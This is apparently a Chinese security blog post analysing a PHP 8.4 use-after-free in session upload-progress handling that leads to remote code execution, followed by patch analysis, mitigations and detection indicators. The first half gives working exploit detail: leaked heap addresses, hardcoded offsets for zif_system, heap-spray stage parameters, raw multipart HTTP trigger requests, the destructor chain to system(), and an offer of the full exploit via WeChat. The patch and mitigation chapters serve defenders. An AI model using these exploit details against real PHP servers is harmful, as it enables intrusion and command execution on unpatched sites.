[+] chunk base = 0x79cdb5400000  
  
[+] libphp base = 0x79cdb56f9000  
  
[*] stage 3: HTDATA=0x79cdb54690d8 ZIF=0x79cdb5b533b0  
  
[+] W3 attempt 1  
  
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)  
  
proof 文件（容器内   
/out/p1）：  
  
uid=33(www-data) gid=33(www-data) groups=33(www-data)  
  
站点随后仍返回   
OK。Apache 日志会出现   
zend_mm_heap corrupted 和 child   
SIGABRT/  
SIGSEGV——这是 UAF 被打成   
zif_system 时的副作用，  
不是「只打崩了服务」。prefork 会拉起新 worker。  
  
写死的常数（相对 ASLR，不随 slide 变）：  
  
zif_system 0x45a3b0  
  
zval_ptr_dtor 0x64eb60  
  
HTDATA chunk + 0x690d8  
  
stage1 filler 841 × 48 字节  
  
stage2 目标数组下标 406，元素值 16 字节  
  
stage3 pad 6 × (name 31, value 31)  
  
stage3 carrier 15 字节覆盖 reference.val  
  
命令上限 14 字节（更长用 sh</out/c）  
  
exp 会拒绝非 8.4.26 / 非 Apache 2.4.68 的目标。确认是这一版再加   
--force。  
  
利用链对应的 HTTP 形态  
  
全部请求都是   
POST /index.php，  
Content-Type: multipart/form-data。下面给出可独立复现的   
Raw；12MiB 的 OOM 字段在文本里截断，生成方式见 6.3 的 Python。  
  
作用：RINIT 之前   
php_session_initialize()，再用超大字段打到   
memory_limit，  
longjmp 留下悬空   
PS(*)。  
  
实测响应：  
  
HTTP/1.1 200 OK  
  
X-Powered-By: PHP/8.4.26  
  
  
Fatal error: Allowed memory size of 8388608 bytes exhausted  
  
(tried to allocate 2098791 bytes) in Unknown on line 0  
  
in Unknown on line 0 = 用户脚本还没开始。  
  
.  
.  
.  
http  
  
POST /index.php HTTP/1.1  
  
Host: 127.0.0.1:8088  
  
Content-Type: multipart/form-data; boundary=----SUPABOUNDARY7  
  
Content-Length: 12583383  
  
Connection: close  
  
  
------SUPABOUNDARY7  
  
Content-Disposition: form-data; name="PHPSESSID"  
  
  
attacksessionid0001  
  
------SUPABOUNDARY7  
  
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"  
  
  
pwn  
  
------SUPABOUNDARY7  
  
Content-Disposition: form-data; name="f"; filename="a.txt"  
  
Content-Type: application/octet-stream  
  
  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
  
------SUPABOUNDARY7  
  
Content-Disposition: form-data; name="big"  
  
  
BBBBBBBB...（12MiB 字节 0x42，必须让解析中的占用 > memory_limit）  
  
------SUPABOUNDARY7--  
  
作用：同一 worker 上再次进入 upload_progress；无文件 part 时走   
MULTIPART_EVENT_END →   
php_session_rfc1867_cleanup() →   
zval_ptr_dtor(残留指针)。  
  
单独打 A+B（不做堆喷）时，B 已能看到跨请求残留：  
  
Warning: PHP Request Startup: Session ID is too long or contains illegal characters...  
  
Warning: PHP Request Startup: Failed to read session data: files (path: /tmp)  
  
.  
.  
.  
http  
  
POST /index.php HTTP/1.1  
  
Host: 127.0.0.1:8088  
  
Content-Type: multipart/form-data; boundary=BNDRY12345  
  
Content-Length: 192  
  
Connection: close  
  
  
--BNDRY12345  
  
Content-Disposition: form-data; name="PHPSESSID"  
  
  
attacksessionid0001  
  
--BNDRY12345  
  
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"  
  
  
pwn  
  
--BNDRY12345--  
  
这两包就是「相对通用的验洞 PoC」。它们证明 UAF/状态残留，  
不会执行命令。  
  
A 在 6.2.1 基础上改为：  
  
1001 个 、值为 （触发 ， → ）  
  
name=p0000..p1000  
  
x  
  
max_input_vars  
  
display_errors=On  
  
headers_sent=1  
  
值为单个 （迫使新 id 且 ）  
  
PHPSESSID  
  
\x00  
  
send_cookie=1  
  
同样的文件 part + 12MiB  
  
big  
  
B 在 6.2.2 基础上追加 841 个 48 字节字段，再跟 79 字节伪造块（  
ZSTR_LEN=0x1000）。响应中：  
  
Set-Cookie: PHPSESSID=LAAAAA...%xx%xx... （url-decode 后 4096 字节）  
  
本机从中解析出   
chunk base = 0x79cdb5400000。  
  
A：progress + 6 组 31/31 pad + 文件 + 12MiB，并带   
Cookie: PHPSESSID=aaa...a（32 个   
a），避免   
Set-Cookie 覆盖伪造 reference 的   
val.type。  
  
B：progress + 15 字节 carrier（改写悬空 reference 的   
val.value 低 7 字节）+ 15 个携带 fake HashTable 的 167 字节字段。  
  
触发：  
  
php_session_track_init()  
  
zval_ptr_dtor(PS(http_session_vars))  
  
zend_reference_destroy(R0)  
  
zend_array_destroy(fake HT)  
  
zend_hash_destroy(fake HT)  
  
pDestructor(&bucket->val) // = zif_system  
  
system("id>/out/p1")  
  
fake HashTable 的二进制随   
chunk/  
libphp 基址变化，  
不能写成与泄漏无关的固定 Raw 包。完整构造见   
exp.py 的   
_fake_payload() /   
stage3()。把 stage3 body 当「通用 HTTP exp」发布，换一台机器就会变成纯崩溃。  
  
仅验证漏洞（无 RCE）的完整代码  
  
bash  
  
python3 -I /home/iot/opt/test/phprce/lab/trigger_upload_progress_oom.py \  
  
127.0.0.1 8088 /index.php  
  
脚本生成 6.2.1 / 6.2.2 两包并打印响应。成功标志是 A 出现   
Unknown on line 0 的 memory exhausted，B 出现 session 警告或 worker 异常，而不是   
PROOF: uid=...。  
  
  
07  
CHAPTER  
### 补丁情况与补丁前后差别  
  
  
官方补丁已发布（2026-10-21，embargo 从 10-22 提前）。  
  
发行版：8.5.12、8.4.27、8.3.36、8.2.35  
  
NEWS：*Fixed GHSA-w8hw-w9fx-j79w, GHSA-6wmf-4rv5-p3rp (Avoid state corruption via bailout). (CVE-2026-109618, CVE-2026-109619)*  
  
提交：[](https://github.com/php/php-src/commit/31c0ea7d7f)  
  
31c0ea7d7ff1d1fccb6492e52dab544011628065  
  
本报告对比了官方 tarball **php-8.4.26 vs php-8.4.27**（完整 diff 在 ）  
  
report/evidence/  
  
618：禁止 OOM `longjmp`  
  
zend_mm_safe_error() →   
zend_bailout()  
  
函数删除  
  
任意 C 帧跳回请求顶层  
  
软 OOM：写入   
EG(delayed_oom)，置   
vm_interrupt，到 VM 安全点再   
zend_throw_unwind_exit()  
  
shutdown 看到半初始化状态  
  
硬 OOM：新 INI   
memory_hard_limit_percent，超限   
_exit(137)，进程直接死，shutdown 看不到坏状态  
  
619：session 全局必须先复位  
  
ext/session/session.c：  
  
**立刻** ，切断上一请求的 /  
  
MULTIPART_EVENT_START  
  
php_rinit_session_globals()  
  
PS(id)  
  
PS(http_session_vars)  
  
检查 返回值，失败即退  
  
php_session_rfc1867_update/cleanup  
  
php_session_initialize()  
  
：解析阶段反序列化只生成  
  
PS(in_rfc1867_update)  
  
__PHP_Incomplete_Class  
  
之后不再跑这条回调  
  
PG(modules_activated)  
  
main/rfc1867.c：  
  
每个 part 只保留 Content-Disposition / Content-Type，去掉「海量自定义头放大内存」  
  
解析循环检测 并有序释放  
  
ZEND_HAS_OOM()  
  
读 body 再次强制  
  
post_max_size  
  
升级后必须重启全部 worker / 容器。发行版 backport 可能版本号不变，以 changelog 是否出现两个 GHSA 为准。  
  
截至本报告编写时，Docker Hub 尚无   
php:8.4.27-apache 标签（源码 tarball 已发布）。  
  
  
08  
CHAPTER  
### 修复建议  
  
  
1  
唯一完整修复：升级到 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 或厂商 backport，然后重启所有 PHP 进程。  
  
2  
无法立即升级时的  
不完整缓解（需   
php_admin_value，重启生效）：  
  
（挡已展示的 session 链，不是全部 619）  
  
session.upload_progress.enabled=0  
  
（去掉可预测 cap，缓解已确认的 618；底层 失败仍可能 bailout）  
  
memory_limit=-1  
  
mmap  
  
调小 ；反代限制 body  
  
post_max_size  
  
不用上传的应用，反代直接丢弃  
  
multipart/form-data  
  
FPM： 缩小跨请求窗口  
  
pm.max_requests=1  
  
PHP 8.5：  
  
fatal_error_backtraces=0  
  
1  
不要设   
RLIMIT_AS /   
RLIMIT_DATA：它们让   
mmap 失败，正好走进脆弱   
longjmp。  
  
2  
应急排查：  
zend_mm_heap corrupted、  
exhausted in Unknown on line 0、异常超长   
Set-Cookie: PHPSESSID=、对任意 PHP 的超大 multipart +   
PHP_SESSION_UPLOAD_PROGRESS。按失陷处理：轮换密钥、查 webshell。  
  
  
09  
CHAPTER  
### 参考  
  
  
https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w  
  
https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp  
  
https://www.php.net/ChangeLog-8.php  
  
https://github.com/php/php-src/commit/31c0ea7d7f  
  
公开定点利用（实验室参考）：https://github.com/9bie/php2shell-bypass-aslr-exp  
  
https://unit42.paloaltonetworks.com/cve-2026-109618-cve-2026-109619/  
  
  
END  
  
对应的exp，关注微信公众号，私信 php2shell 获取  
  
我是网络安全透视镜。  
  
如果你觉得今天这篇有收获，欢迎**点赞、在看、转发**  
三连，我们下篇见。  
  
  
